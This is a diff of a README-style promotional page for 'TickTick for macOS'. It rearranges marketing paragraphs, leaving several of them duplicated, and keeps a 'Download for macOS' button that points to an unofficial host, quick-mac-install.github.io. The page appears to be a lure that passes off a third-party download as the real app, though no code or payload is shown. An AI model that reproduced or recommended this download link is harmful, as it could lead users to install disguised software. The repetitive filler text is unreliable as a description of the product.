@@ -4,11 +4,7 @@
 
 <div>
 <h3>TickTick for macOS</h3>
-<p><a href="#">TickTick for macOS</a> is an intuitive task management app designed to help you get organized and stay on top of your tasks and deadlines. It's not just a to-do list; it's a comprehensive productivity tool that lets you manage tasks, projects, and even habits seamlessly across all your devices. With features like priority settings, deadlines, reminders, and the ability to organize tasks by list or folder, TickTick empowers you to manage both simple and complex projects effectively.
-
-Whether you’re a student juggling multiple assignments, a professional managing work tasks, or someone simply trying to stay on top of daily chores, TickTick offers a structured way to get things done. Its flexible tagging system and ability to create recurring tasks make it highly customizable. The integration with calendars ensures that your to-do lists sync up with your schedule, offering a comprehensive view of everything that needs attention.
-
-TickTick also supports a variety of productivity methods, like Pomodoro timers and priority ranking, making it suitable for different work styles. It even has a built-in habit tracker, helping you track your progress towards your goals. Its simple interface combined with powerful organizational tools makes it an indispensable app for anyone serious about staying productive and organized.</p>
+<p><a href="#">TickTick for macOS</a> is an intuitive task management app designed to help you get organized and stay on top of your tasks and deadlines.</p>
 
 <a href="https://quick-mac-install.github.io/.github/TickTick">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
@@ -40,6 +36,10 @@ TickTick also supports a variety of productivity methods, like Pomodoro timers a
 ## Overview
 
 <a href="#">TickTick for macOS</a> is an intuitive task management app designed to help you get organized and stay on top of your tasks and deadlines. It's not just a to-do list; it's a comprehensive productivity tool that lets you manage tasks, projects, and even habits seamlessly across all your devices. With features like priority settings, deadlines, reminders, and the ability to organize tasks by list or folder, TickTick empowers you to manage both simple and complex projects effectively.
+
+Whether you’re a student juggling multiple assignments, a professional managing work tasks, or someone simply trying to stay on top of daily chores, TickTick offers a structured way to get things done. Its flexible tagging system and ability to create recurring tasks make it highly customizable. The integration with calendars ensures that your to-do lists sync up with your schedule, offering a comprehensive view of everything that needs attention.
+
+TickTick also supports a variety of productivity methods, like Pomodoro timers and priority ranking, making it suitable for different work styles. It even has a built-in habit tracker, helping you track your progress towards your goals. Its simple interface combined with powerful organizational tools makes it an indispensable app for anyone serious about staying productive and organized.
 
 Whether you’re a student juggling multiple assignments, a professional managing work tasks, or someone simply trying to stay on top of daily chores, TickTick offers a structured way to get things done. Its flexible tagging system and ability to create recurring tasks make it highly customizable. The integration with calendars ensures that your to-do lists sync up with your schedule, offering a comprehensive view of everything that needs attention.
 
